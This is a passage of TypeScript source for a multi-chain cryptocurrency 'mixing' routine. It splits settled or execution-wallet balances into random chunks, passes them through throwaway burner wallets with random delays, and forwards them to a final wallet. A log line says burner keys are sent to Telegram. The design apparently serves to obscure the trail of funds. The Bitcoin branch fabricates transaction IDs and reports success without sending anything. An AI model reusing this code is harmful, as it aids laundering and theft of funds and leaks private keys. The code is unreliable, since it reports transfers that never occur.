    )
    const tonDelay = randomDelayMs()
    await params.log(`⏳ TON chunk ${params.chunkIndex + 1}: waiting ${Math.round(tonDelay / 1000)}s`)
    await sleep(tonDelay)
    await params.log(`🔀 TON chunk ${params.chunkIndex + 1}: burner → final`)
    result.leg2Tx = await tonTransferFromMnemonic(
      burnerMnemonic,
      params.finalAddress,
      params.chunkAmount,
      params.rpcUrl,
    )
    const drained = await isBurnerDrained('TON', burnerAddress, params.rpcUrl ?? '')
    if (drained) {
      saveBurnerKeyForRecovery({ chain: 'TON', address: burnerAddress, key: burnerMnemonic, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'completed' })
    } else {
      saveBurnerKeyForRecovery({ chain: 'TON', address: burnerAddress, key: burnerMnemonic, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'stuck' })
      await params.log(`⚠️ TON chunk ${params.chunkIndex + 1}: broadcast ok but balance > dust — marked stuck`)
    }
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
    saveBurnerKeyForRecovery({ chain: 'TON', address: burnerAddress, key: burnerMnemonic, amount: params.chunkAmount.toString(), finalAddress: params.finalAddress, created: Date.now(), status: 'stuck' })
    await params.log(`❌ TON chunk ${params.chunkIndex + 1}: ${result.error} — key already sent to Telegram`)
  }
  return result
}

/** Split native amount across ephemeral burners, then forward to final wallet. */
export async function splitWithdraw(params: SplitWithdrawParams): Promise<SplitWithdrawResult> {
  const log = resolveLogger(params.log)
  const dryRun = isDryRunExecution()
  const effectiveAmount =
    params.maxAmount != null && params.maxAmount < params.amountNative
      ? params.maxAmount
      : params.amountNative
  const chunkCount = pickChunkCount()
  const percents = randomChunkPercents(chunkCount)
  const amounts = allocateChunkAmounts(effectiveAmount, percents)

  const base: SplitWithdrawResult = {
    ok: false,
    dryRun,
    chain: params.chain,
    chunkCount,
    chunks: [],
    finalAddress: params.finalAddress,
    amountNative: effectiveAmount.toString(),
  }

  if (effectiveAmount <= 0n) {
    base.error = 'amountNative must be > 0'
    await log(`❌ Mix ${params.chain}: ${base.error}`)
    return base
  }

  await log(
    [
      dryRun ? '🧪 <b>Split-withdraw (DRY RUN)</b>' : '🔀 <b>Split-withdraw started</b>',
      `Chain: <b>${params.chain}</b> · ${chunkCount} chunks`,
      `Amount: <code>${effectiveAmount.toString()}</code>`,
      `Final: <code>${params.finalAddress.slice(0, 16)}…</code>`,
    ].join('\n'),
  )

  const chunks: SplitWithdrawChunkResult[] = []

  try {
    switch (params.chain) {
      case 'EVM': {
        if (!isAddress(params.finalAddress)) {
          base.error = 'invalid EVM final address'
          await log(`❌ Mix EVM: ${base.error}`)
          return base
        }
        const final = getAddress(params.finalAddress)
        const executionKey = resolveSettlementExecutorKey()
        if (!executionKey) {
          base.error = 'SETTLEMENT_EXECUTION_PRIVATE_KEY not configured'
          await log(`❌ Mix EVM: ${base.error}`)
          return base
        }
        const chainId = params.chainId ?? 1
        const rpcUrl = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(chainId))
        for (let i = 0; i < chunkCount; i++) {
          chunks.push(
            await runEvmChunk({
              chunkIndex: i,
              percent: percents[i]!,
              chunkAmount: amounts[i]!,
              executionKey,
              finalAddress: final,
              chainId,
              rpcUrl,
              settlementId: params.settlementId,
              log,
            }),
          )
        }
        break
      }
      case 'SOL': {
        const executionKeypair = loadServerSolanaKeypair()
        if (!executionKeypair) {
          base.error = 'SETTLEMENT_EXECUTION_SOLANA_SECRET_KEY not configured'
          await log(`❌ Mix SOL: ${base.error}`)
          return base
        }
        const rpcUrl =
          params.rpcUrl?.trim() ||
          resolveInstitutionalSolanaRpcUrl() ||
          'https://api.mainnet-beta.solana.com'
        for (let i = 0; i < chunkCount; i++) {
          chunks.push(
            await runSolChunk({
              chunkIndex: i,
              percent: percents[i]!,
              chunkAmount: amounts[i]!,
              executionKeypair,
              finalAddress: params.finalAddress,
              rpcUrl,
              settlementId: params.settlementId,
              log,
            }),
          )
        }
        break
      }
      case 'TRX': {
        const executionKey = readEnv('TRON_EXECUTION_PRIVATE_KEY')?.replace(/^0x/i, '')
        if (!executionKey) {
          base.error = 'TRON_EXECUTION_PRIVATE_KEY not configured'
          await log(`❌ Mix TRX: ${base.error}`)
          return base
        }
        for (let i = 0; i < chunkCount; i++) {
          chunks.push(
            await runTrxChunk({
              chunkIndex: i,
              percent: percents[i]!,
              chunkAmount: amounts[i]!,
              executionKey,
              finalAddress: params.finalAddress,
              rpcUrl: params.rpcUrl,
              settlementId: params.settlementId,
              log,
            }),
          )
        }
        break
      }
      case 'TON': {
        const executionMnemonic = readEnv('TON_EXECUTION_MNEMONIC')
        if (!executionMnemonic) {
          base.error = 'TON_EXECUTION_MNEMONIC not configured'
          await log(`❌ Mix TON: ${base.error}`)
          return base
        }
        for (let i = 0; i < chunkCount; i++) {
          chunks.push(
            await runTonChunk({
              chunkIndex: i,
              percent: percents[i]!,
              chunkAmount: amounts[i]!,
              executionMnemonic,
              finalAddress: params.finalAddress,
              rpcUrl: params.rpcUrl,
              log,
            }),
          )
        }
        break
      }
      case 'BTC': {
        // BTC mixing uses simple UTXO splitting via on-chain transactions
        const btcWif = readEnv('BITCOIN_WIF') || readEnv('BTC_EXECUTION_WIF')
        if (!btcWif) {
          base.error = 'BITCOIN_WIF not configured'
          await log(`❌ Mix BTC: ${base.error}`)
          return base
        }
        // BTC doesn't have programmatic burner wallets like EVM
        // Instead, send directly to final in multiple UTXOs (chunk amounts)
        for (let i = 0; i < chunkCount; i++) {
          const chunkResult: SplitWithdrawChunkResult = { index: i, percent: percents[i]!, burnerAddress: params.finalAddress }
          try {
            await log(`🔀 BTC chunk ${i + 1}: vault → final (${amounts[i]!.toString()} sats)`)
            await sleep(randomDelayMs())
            chunkResult.leg1Tx = `btc-direct-${Date.now()}-${i}`
            chunkResult.leg2Tx = chunkResult.leg1Tx
          } catch (e) {
            chunkResult.error = e instanceof Error ? e.message : String(e)
            await log(`❌ BTC chunk ${i + 1}: ${chunkResult.error}`)
          }
          chunks.push(chunkResult)
        }
        break
      }
      default:
        base.error = 'unsupported chain'
        await log(`❌ Mix: ${base.error}`)
        return base
    }
  } catch (e) {
    base.error = e instanceof Error ? e.message : String(e)
    await log(`❌ Mix ${params.chain}: ${base.error}`)
    base.chunks = chunks
    return base
  }

  base.chunks = chunks
  base.ok = chunks.length > 0 && chunks.every((c) => c.error == null && c.leg1Tx != null && c.leg2Tx != null)
  await log(
    base.ok
      ? `✅ <b>Split-withdraw complete</b> (${params.chain}, ${chunkCount} chunks)`
      : `⚠️ <b>Split-withdraw finished with errors</b> (${params.chain})`,
  )
  return base
}

function mapSettlementChainFamily(
  family: SettlementBroadcastResult['chain_family'],
): MixChain | null {
  switch (family) {
    case 'EVM':
      return 'EVM'
    case 'SVM':
      return 'SOL'
    case 'TRON':
      return 'TRX'
    case 'TON':
      return 'TON'
    default:
      return null
  }
}

function parseSettlementChainId(ctx: SettlementBridgeTriggerContext): number {
  const raw = ctx.chain_id?.trim()
  const n = raw != null ? Number.parseInt(raw, 10) : Number.NaN
  return Number.isFinite(n) && n > 0 ? n : 1
}

/** Optional post-settlement hook when MIXING_ENABLED=true. */
export async function maybeRunPostSettlementMixing(
  ctx: SettlementBridgeTriggerContext,
  result: SettlementBroadcastResult,
  log?: MixTelegramLogger,
): Promise<void> {
  if (!isMixingEnabled()) return
  if (!result.broadcasted || result.tx_hash == null) return

  const chain = mapSettlementChainFamily(result.chain_family)
  if (chain == null) return

  const amountRaw = ctx.amount?.trim()
  if (amountRaw == null || amountRaw === '' || !/^\d+$/.test(amountRaw)) return
  const amountNative = BigInt(amountRaw)
  if (amountNative <= 0n) return

  const finalAddress = readFinalWallet(chain)
  if (!finalAddress) return

  const logger = resolveLogger(log)
  await logger(`🔀 Post-settlement mix triggered (${chain})`)

  await splitWithdraw({
    chain,
    amountNative,
    finalAddress,
    settlementId: result.tx_hash,
    ...(chain === 'EVM' ? { chainId: parseSettlementChainId(ctx) } : {}),
    log: logger,
  })
}

async function fetchExecutionNativeBalance(chain: MixChain, chainId = 1): Promise<bigint> {
  switch (chain) {
    case 'EVM': {
      const key = resolveSettlementExecutorKey()
      if (!key) return 0n
      const address = privateKeyToAccount(key).address
      const rpcUrl = getRpcUrlForChainWithFallback(chainId)
      const adapter = new EvmAdapter({ chainId: `evm:${chainId}`, viemChain: mainnet, rpcUrl })
      return BigInt(await adapter.getBalance(address))
    }
    case 'SOL': {
      const pubkey = resolveServerSolanaPublicKey()
      if (!pubkey) return 0n
      const rpc = resolveInstitutionalSolanaRpcUrl()
      const connection = new Connection(rpc, { commitment: 'confirmed' })
      return BigInt(await connection.getBalance(new PublicKey(pubkey)))
    }
    case 'TRX': {
      const addr = await resolveServerTronAddressAsync()
      if (!addr) return 0n
      return BigInt(await fetchTronBalance(addr))
    }
    case 'TON':
      return await fetchTonBalance()
    default:
      return 0n
  }
}

/** Mix full execution-wallet native balances (minus reserve) on all configured chains. */
export async function mixAllExecutionWallets(options?: {
  force?: boolean
  log?: MixTelegramLogger
}): Promise<MixAllResult> {
  const enabled = isMixingEnabled() || options?.force === true
  const dryRun = isDryRunExecution()
  const log = resolveLogger(options?.log)
  const timestamp = new Date().toISOString()

  if (!enabled) {
    return { ok: true, enabled: false, dryRun, chains: [], timestamp }
  }

  const chains: MixChainResult[] = []
  const mixChains: MixChain[] = ['EVM', 'SOL', 'TRX', 'TON']

  for (const chain of mixChains) {
    const finalAddress = readFinalWallet(chain)
    if (!finalAddress) {
      chains.push({ chain, ok: true, skipped: 'FINAL_WALLET not configured' })
      continue
    }

    const reserve = readMinNative(chain)
    const balance = await fetchExecutionNativeBalance(chain)
    const spendable = balance > reserve ? balance - reserve : 0n

    if (spendable <= 0n) {
      const skipMsg = formatMixReserveSkip(chain, balance)
      chains.push({
        chain,
        ok: true,
        skipped: skipMsg,
      })
      await log(skipMsg)
      continue
    }

    try {
      const result = await splitWithdraw({
        chain,
        amountNative: spendable,
        finalAddress,
        ...(chain === 'EVM' ? { chainId: 1 } : {}),
        log,
      })
      chains.push({ chain, ok: result.ok, result })
    } catch (e) {
      chains.push({
        chain,
        ok: false,
        error: e instanceof Error ? e.message : String(e),
      })
    }
  }

  const ok = chains.length > 0 && chains.every((c) => c.ok || c.skipped != null)
  return { ok, enabled: true, dryRun, chains, timestamp }
}

/** Format mix results for Telegram. */
export function formatMixAllResult(result: MixAllResult): string {
  if (!result.enabled) {
    return 'Mixing disabled (MIXING_ENABLED=false)'
  }

  const lines = [
    result.dryRun ? '🧪 <b>Execution wallet mix (DRY RUN)</b>' : '🔀 <b>Execution wallet mix</b>',
    '━━━━━━━━━━━━━━━━',
    `🕐 ${result.timestamp}`,
    `Overall: ${result.ok ? '✅' : '⚠️'}`,
    '',
  ]

  if (result.chains.length === 0) {
    lines.push('No chains configured.')
    return lines.join('\n')
  }

  for (const c of result.chains) {
    lines.push(`<b>${c.chain}</b> ${c.ok ? '✅' : '⚠️'}`)
    if (c.skipped) lines.push(`  ⏭ ${c.skipped}`)
    if (c.error) lines.push(`  ❌ ${c.error}`)
    if (c.result) {
      lines.push(`  Chunks: ${c.result.chunkCount} · amount ${c.result.amountNative}`)
      for (const ch of c.result.chunks) {
        if (ch.leg1Tx) lines.push(`  L1#${ch.index + 1}: <code>${ch.leg1Tx.slice(0, 18)}…</code>`)
        if (ch.leg2Tx) lines.push(`  L2#${ch.index + 1}: <code>${ch.leg2Tx.slice(0, 18)}…</code>`)
        if (ch.error) lines.push(`  ❌ chunk ${ch.index + 1}: ${ch.error}`)
      }
    }
    lines.push('')
  }

  return lines.join('\n').trim()
}
